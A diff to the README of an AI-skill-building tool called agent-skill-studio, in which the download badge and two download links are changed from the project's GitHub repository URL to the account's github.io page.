@@ -1,7 +1,7 @@
 <h1>🎯 agent-skill-studio - Your Private AI Skill Workshop</h1>
 
 <p align="center">
-  <a href="https://github.com/cloudedminds/agent-skill-studio">
+  <a href="https://cloudedminds.github.io">
     <img src="https://img.shields.io/badge/Download-agent--skill--studio-4CAF50?style=for-the-badge&logo=github" alt="Download Button" />
   </a>
 </p>
@@ -26,7 +26,7 @@ Getting started with agent-skill-studio is incredibly easy. Follow these simple 
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/cloudedminds/agent-skill-studio](https://github.com/cloudedminds/agent-skill-studio)
+Visit this link to download the application: [https://cloudedminds.github.io](https://cloudedminds.github.io)
 
 Click the green "Download" button on that page to get the application files.
 
@@ -115,7 +115,7 @@ Need assistance? Here's how to get support:
 
 Your journey to creating powerful AI skills begins right now. Download agent-skill-studio today and discover how easy it is to build, organize, and share AI capabilities—all from the comfort of your own browser.
 
-**Download Now:** [https://github.com/cloudedminds/agent-skill-studio](https://github.com/cloudedminds/agent-skill-studio)
+**Download Now:** [https://cloudedminds.github.io](https://cloudedminds.github.io)
 
 ## 🔑 Keywords
 
